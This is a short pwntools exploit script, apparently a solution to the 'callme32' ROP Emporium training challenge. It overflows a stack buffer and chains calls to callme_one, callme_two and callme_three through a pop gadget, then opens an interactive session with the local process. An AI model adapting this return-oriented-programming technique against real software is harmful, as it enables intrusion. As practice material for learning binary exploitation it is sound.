from pwn import *

sh = process('./callme32')
elf = ELF('./callme32')

one_addr = elf.symbols['callme_one']
two_addr = elf.symbols['callme_two']
thr_addr = elf.symbols['callme_three']

rop_addr = 0x080488a9

payload_start = 'a' * (0x28 + 0x4)
payload_one = p32(one_addr) + p32(rop_addr) + p32(1) + p32(2) + p32(3)
payload_two = p32(two_addr) + p32(rop_addr) + p32(1) + p32(2) + p32(3)
payload_thr = p32(thr_addr) + p32(0xdeedbeef) + p32(1) + p32(2) + p32(3)

payload = payload_start + payload_one + payload_two + payload_thr

sh.recvuntil('>')
sh.sendline(payload)

sh.interactive()
sh.close()